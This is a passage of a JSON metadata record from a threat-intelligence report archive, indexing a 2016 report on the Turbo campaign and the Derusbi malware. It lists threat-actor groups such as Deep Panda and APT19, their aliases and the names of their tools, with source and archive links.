            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2016/2016.02.29.Turbo_Campaign_Derusbi/TA_Fidelis_Turbo_1602_0.pdf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.02.29.Turbo_Campaign_Derusbi/TA_Fidelis_Turbo_1602_0.pdf"
    ],
    "report_names": [
        "TA_Fidelis_Turbo_1602_0.pdf",
        "TA_Fidelis_Turbo_1602_0"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1edcac0b-efd9-47b1-9aca-33827d5bd085",
            "created_at": "2024-05-01T02:03:07.964773Z",
            "updated_at": "2025-03-27T02:05:17.273595Z",
            "deleted_at": null,
            "main_name": "BRONZE KEYSTONE",
            "aliases": [
                "Aurora Panda ",
                "DeputyDog ",
                "Group 72 ",
                "Hidden Lynx ",
                "Shell Crew",
                "TG-8153 ",
                "Tailgater Team",
                "APT17 "
            ],
            "source_name": "Secureworks:BRONZE KEYSTONE",
            "tools": [
                " BlackCoffee",
                " DeputyDog",
                " Derusbi",
                " Gh0stHTTPSDropper",
                " HiKit",
                " InternalCMD",
                " PlugX",
                " PoisonIvy",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041765,
    "ts_creation_date": 1457445903,
    "ts_modification_date": 1457445904,
    "files": {
        "pdf": "https://archive.orkl.eu/01fda1bcf39d3c6bc88434cca97aff08db32819b.pdf",
        "text": "https://archive.orkl.eu/01fda1bcf39d3c6bc88434cca97aff08db32819b.txt",
        "img": "https://archive.orkl.eu/01fda1bcf39d3c6bc88434cca97aff08db32819b.jpg"
    }
}